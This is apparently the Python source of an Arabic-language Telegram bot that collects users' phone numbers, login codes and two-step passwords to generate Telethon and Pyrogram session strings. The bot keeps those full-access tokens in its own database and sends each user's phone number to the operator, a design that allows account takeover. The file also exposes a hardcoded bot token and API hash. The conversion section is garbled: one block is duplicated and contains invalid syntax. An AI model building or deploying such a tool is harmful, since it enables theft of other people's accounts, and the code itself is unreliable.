import asyncio, aiosqlite, json, logging
from datetime import datetime
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneNumberInvalid
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(level=logging.INFO)

# ========== الإعدادات - عدل دي ==========
TOKEN = "8917859065:AAH0RlZ87TeAPk1D0qI0DPtZNOhAa8KlvjQ" # حط التوكن بتاعك هنا
ADMIN_ID = 29449730  # حط الايدي بتاعك هنا
API_ID = 37879014    # حط api_id بتاعك
API_HASH = "db129fe3286650ad869b2891abd72df2" # حط api_hash بتاعك
DEV_USERNAME = "aabdulrahmaan"
DEVICE_NAME = "iPhone 17 pro"

# ========== قاعدة البيانات ==========
async def init_db():
    async with aiosqlite.connect("bot.db") as db:
        await db.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            state TEXT,
            temp_data TEXT,
            sessions_count INTEGER DEFAULT 0
        )""")
        await db.execute("""CREATE TABLE IF NOT EXISTS sessions_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            session_type TEXT,
            created_at TEXT
        )""")
        await db.commit()

async def set_user_state(user_id, username, state, temp_data=None):
    async with aiosqlite.connect("bot.db") as db:
        await db.execute("INSERT OR REPLACE INTO users (user_id, username, state, temp_data) VALUES (?,?,?,?)",
            (user_id, username, state, json.dumps(temp_data) if temp_data else None))
        await db.commit()

async def get_user_state(user_id):
    async with aiosqlite.connect("bot.db") as db:
        async with db.execute("SELECT state, temp_data FROM users WHERE user_id=?", (user_id,)) as cur:
            row = await cur.fetchone()
            if row:
                state, temp_data = row
                return state, json.loads(temp_data) if temp_data else {}
            return None, {}

async def log_session(user_id, phone, session_type):
    async with aiosqlite.connect("bot.db") as db:
        await db.execute("INSERT INTO sessions_log (user_id, phone, session_type, created_at) VALUES (?,?,?,?)",
            (user_id, phone, session_type, datetime.now().isoformat()))
        await db.execute("UPDATE users SET sessions_count = sessions_count + 1 WHERE user_id=?", (user_id,))
        await db.commit()
    if ADMIN_ID:
        try:
            await app.bot.send_message(ADMIN_ID, f"🔐 <b>نسخة احتياطية</b>\n\n👤 <code>{user_id}</code>\n📱 <code>{phone}</code>\n⚙️ {session_type}", parse_mode='HTML')
        except: pass

# ========== الرسائل ==========
WELCOME_MSG = """
<b><tg-emoji emoji-id="5798482080421649554">🔒</tg-emoji></b><b> ‹ </b><b>{name}</b><b> › </b><b><tg-emoji emoji-id="5798482080421649554">🔒</tg-emoji></b>

<b><tg-emoji emoji-id="5796499583647359561">📌</tg-emoji></b><b> 𝗦𝗘𝗦𝗜𝗢𝗡 𝗘𝗫𝗧𝗥𝗔𝗖𝗧𝗢𝗥 𝗣𝗥𝗢 </b><b><tg-emoji emoji-id="5796499583647359561">📌</tg-emoji></b>

<b><tg-emoji emoji-id="5798941981224737816">🚀</tg-emoji></b><b> أهلاً بك في أقوى بوت استخراج جلسات </b><b><tg-emoji emoji-id="5798941981224737816">🚀</tg-emoji></b>

<b><tg-emoji emoji-id="5794353922816429699">🛡️</tg-emoji></b><b> ايديك : <code>{user_id}</code> </b><b><tg-emoji emoji-id="5794353922816429699">🛡️</tg-emoji></b>

<b><tg-emoji emoji-id="5796526727840669257">🎲</tg-emoji></b><b> استخراج تليثون + بايوجرام </b><b><tg-emoji emoji-id="5796526727840669257">🎲</tg-emoji></b>

<b><tg-emoji emoji-id="5794353922816429699">⚡</tg-emoji></b><b> تحويل فوري بين المكتبتين </b><b><tg-emoji emoji-id="5794353922816429699">⚡</tg-emoji></b>
"""

# ========== Start ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"!!! START FROM {update.effective_user.id}!!!")
    user = update.effective_user
    await set_user_state(user.id, user.username, None)
    welcome_text = WELCOME_MSG.format(name=user.first_name, user_id=user.id)
    keyboard = [
        [InlineKeyboardButton("📱 استخراج جلسة تليثون", callback_data="extract_telethon")],
        [InlineKeyboardButton("📱 استخراج جلسة بايوجرام", callback_data="extract_pyro")],
        [InlineKeyboardButton("🔄 تليثون → بايوجرام", callback_data="tele_to_pyro")],
        [InlineKeyboardButton("🔄 بايوجرام → تليثون", callback_data="pyro_to_tele")],
        [InlineKeyboardButton("👨‍💻 المبرمج", url=f"https://t.me/{DEV_USERNAME}")]
    ]
    if user.id == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("⚙️ لوحة الأدمن", callback_data="admin_panel")])
    await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# ========== استخراج تليثون ==========
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    text = update.message.text
    state, temp_data = await get_user_state(user_id)

    print(f"Message from {user_id}: state={state}, text={text}")

    if state == "waiting_phone_telethon":
        phone = text.strip()
        await update.message.reply_text("⏳ جاري إرسال الكود...")
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            sent = await client.send_code_request(phone)
            temp_data = {"phone": phone, "phone_code_hash": sent.phone_code_hash, "session": client.session.save()}
            await set_user_state(user_id, username, "waiting_code_telethon", temp_data)
            await update.message.reply_text("📩 تم إرسال الكود، ابعته هنا:\n\nمثال: `12345`", parse_mode='Markdown')
        except PhoneNumberInvalidError:
            await update.message.reply_text("❌ رقم الهاتف غير صحيح")
            await set_user_state(user_id, username, None)
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
            await set_user_state(user_id, username, None)
        finally:
            await client.disconnect()

    elif state == "waiting_code_telethon":
        code = text.strip()
        phone = temp_data.get("phone")
        phone_code_hash = temp_data.get("phone_code_hash")
        session = temp_data.get("session")

        client = TelegramClient(StringSession(session), API_ID, API_HASH)
        try:
            await client.connect()
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            session_string = client.session.save()
            await update.message.reply_text(f"✅ <b>تم استخراج الجلسة بنجاح</b>\n\n<code>{session_string}</code>\n\n⚠️ لا تشاركها مع احد", parse_mode='HTML')
            await log_session(user_id, phone, "Telethon")
            await set_user_state(user_id, username, None)
        except SessionPasswordNeededError:
            temp_data["session"] = client.session.save()
            await set_user_state(user_id, username, "waiting_password_telethon", temp_data)
            await update.message.reply_text("🔐 الحساب محمي بكلمة مرور ثنائية، ابعتها هنا:")
        except PhoneCodeInvalidError:
            await update.message.reply_text("❌ الكود غير صحيح، حاول تاني:")
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
            await set_user_state(user_id, username, None)
        finally:
            await client.disconnect()

    elif state == "waiting_password_telethon":
        password = text.strip()
        phone = temp_data.get("phone")
        session = temp_data.get("session")

        client = TelegramClient(StringSession(session), API_ID, API_HASH)
        try:
            await client.connect()
            await client.sign_in(password=password)
            session_string = client.session.save()
            await update.message.reply_text(f"✅ <b>تم استخراج الجلسة بنجاح</b>\n\n<code>{session_string}</code>\n\n⚠️ لا تشاركها مع احد", parse_mode='HTML')
            await log_session(user_id, phone, "Telethon")
            await set_user_state(user_id, username, None)
        except Exception as e:
            await update.message.reply_text(f"❌ كلمة المرور غلط: {e}")
        finally:
            await client.disconnect()

    # ========== استخراج بايوجرام ==========
    elif state == "waiting_phone_pyro":
        phone = text.strip()
        await update.message.reply_text("⏳ جاري إرسال الكود...")
        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
        try:
            await client.connect()
            sent = await client.send_code(phone)
            temp_data = {"phone": phone, "phone_code_hash": sent.phone_code_hash, "session": await client.export_session_string()}
            await set_user_state(user_id, username, "waiting_code_pyro", temp_data)
            await update.message.reply_text("📩 تم إرسال الكود، ابعته هنا:")
        except PhoneNumberInvalid:
            await update.message.reply_text("❌ رقم الهاتف غير صحيح")
            await set_user_state(user_id, username, None)
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
            await set_user_state(user_id, username, None)
        finally:
            await client.disconnect()

    elif state == "waiting_code_pyro":
        code = text.strip()
        phone = temp_data.get("phone")
        phone_code_hash = temp_data.get("phone_code_hash")

        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
        try:
            await client.connect()
            await client.sign_in(phone_number=phone, phone_code_hash=phone_code_hash, phone_code=code)
            session_string = await client.export_session_string()
            await update.message.reply_text(f"✅ <b>تم استخراج الجلسة بنجاح</b>\n\n<code>{session_string}</code>\n\n⚠️ لا تشاركها مع احد", parse_mode='HTML')
            await log_session(user_id, phone, "Pyrogram")
            await set_user_state(user_id, username, None)
        except SessionPasswordNeeded:
            await set_user_state(user_id, username, "waiting_password_pyro", {"phone": phone, "session": await client.export_session_string()})
            await update.message.reply_text("🔐 الحساب محمي بكلمة مرور ثنائية، ابعتها هنا:")
        except PhoneCodeInvalid:
            await update.message.reply_text("❌ الكود غير صحيح، حاول تاني:")
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
            await set_user_state(user_id, username, None)
        finally:
            await client.disconnect()

    elif state == "waiting_password_pyro":
        password = text.strip()
        phone = temp_data.get("phone")
        session = temp_data.get("session")

        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH, session_string=session)
        try:
            await client.connect()
            await client.check_password(password)
            session_string = await client.export_session_string()
            await update.message.reply_text(f"✅ <b>تم استخراج الجلسة بنجاح</b>\n\n<code>{session_string}</code>\n\n⚠️ لا تشاركها مع احد", parse_mode='HTML')
            await log_session(user_id, phone, "Pyrogram")
            await set_user_state(user_id, username, None)
        except Exception as e:
            await update.message.reply_text(f"❌ كلمة المرور غلط: {e}")
        finally:
            await client.disconnect()

    # ========== التحويل ==========
    elif state == "waiting_session_tele_to_pyro":
        telethon_session = text.strip()
        await update.message.reply_text("⏳ جاري التحويل...")
        try:
            t_client = TelegramClient(StringSession(telethon_session), API_ID, API_HASH)
            await t_client.connect()
            if not await t_client.is_user_authorized():
                await update.message.reply_text("❌ الجلسة غير صالحة")
                await t_client.disconnect()
                return
            me = await t_client.get_me()
            phone = me.phone
            # خد الداتا قبل ما تقفل الكلاينت
            dc_id = t_client.session.dc_id
            auth_key = t_client.session.auth_key
            user_id = me.id
            is_bot = me.bot
            await t_client.disconnect()

            p_client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
            await p_client.connect()
            # التعديل هنا: شيلنا await
            await p_client.storage.set_dc(dc_id)
            await p_client.storage.set_auth_key(auth_key)
            await p_client.storage.set_user_id(user_id)
            await p_client.storage.set_is_bot(is_bot)
            pyro_session = await p_client.export_session_string()
            await p_client.disconnect()

            await update.message.reply_text(f"✅ <b>تم التحويل بنجاح</b>\n\n<code>{pyro_session}</code>", parse_mode='HTML')
            await log_session(user_id, phone, "Telethon → Pyrogram")
            await set_user_state(user_id, username, None)
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ في التحويل: {e}")
            await set_user_state(user_id, username, None)

            p_client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
            await p_client.connect()
            await p_client.storage.dc_id = t_client.session.dc_id
            await p_client.storage.auth_key = t_client.session.auth_key
            await p_client.storage.user_id = me.id
            await p_client.storage.is_bot = me.bot
            pyro_session = await p_client.export_session_string()
            await p_client.disconnect()

            await update.message.reply_text(f"✅ <b>تم التحويل بنجاح</b>\n\n<code>{pyro_session}</code>", parse_mode='HTML')
            await log_session(user_id, phone, "Telethon → Pyrogram")
            await set_user_state(user_id, username, None)
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ في التحويل: {e}")
            await set_user_state(user_id, username, None)

    elif state == "waiting_session_pyro_to_tele":
        pyro_session = text.strip()
        await update.message.reply_text("⏳ جاري التحويل...")
        try:
            p_client = Client(":memory:", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session)
            await p_client.connect()
            if not await p_client.is_initialized:
                await update.message.reply_text("❌ الجلسة غير صالحة")
                await p_client.disconnect()
                return
            me = await p_client.get_me()
            phone = me.phone
            dc_id = await p_client.storage.dc_id
            auth_key = await p_client.storage.auth_key
            await p_client.disconnect()

            t_client = TelegramClient(StringSession(), API_ID, API_HASH)
            t_client.session.set_dc(dc_id, None, 443)
            t_client.session.auth_key = auth_key
            await t_client.connect()
            telethon_session = t_client.session.save()
            await t_client.disconnect()

            await update.message.reply_text(f"✅ <b>تم التحويل بنجاح</b>\n\n<code>{telethon_session}</code>", parse_mode='HTML')
            await log_session(user_id, phone, "Pyrogram → Telethon")
            await set_user_state(user_id, username, None)
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ في التحويل: {e}")
            await set_user_state(user_id, username, None)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    username = query.from_user.username

    if query.data == "extract_telethon":
        await set_user_state(user_id, username, "waiting_phone_telethon")
        await query.message.reply_text("📱 ابعت رقم الهاتف مع كود الدولة:\n\nمثال: `+201234567890`", parse_mode='Markdown')
    elif query.data == "extract_pyro":
        await set_user_state(user_id, username, "waiting_phone_pyro")
        await query.message.reply_text("📱 ابعت رقم الهاتف مع كود الدولة:\n\nمثال: `+201234567890`", parse_mode='Markdown')
    elif query.data == "tele_to_pyro":
        await set_user_state(user_id, username, "waiting_session_tele_to_pyro")
        await query.message.reply_text("📝 ابعت جلسة التليثون:")
    elif query.data == "pyro_to_tele":
        await set_user_state(user_id, username, "waiting_session_pyro_to_tele")
        await query.message.reply_text("📝 ابعت جلسة البايوجرام:")
    elif query.data == "admin_panel" and user_id == ADMIN_ID:
        async with aiosqlite.connect("bot.db") as db:
            async with db.execute("SELECT COUNT(*) FROM users") as cur:
                total_users = (await cur.fetchone())[0]
            async with db.execute("SELECT COUNT(*) FROM sessions_log") as cur:
                total_sessions = (await cur.fetchone())[0]
        await query.message.reply_text(f"⚙️ <b>لوحة الأدمن</b>\n\n👥 المستخدمين: {total_users}\n🔐 الجلسات المستخرجة: {total_sessions}", parse_mode='HTML')

# ========== تشغيل البوت ==========
app = None

async def main():
    global app
    print("Bot Started...")
    await init_db()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    await app.bot.delete_webhook(drop_pending_updates=True)
    print("Starting polling...")
    await app.initialize()
    await app.start()
    await app.updater.start_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
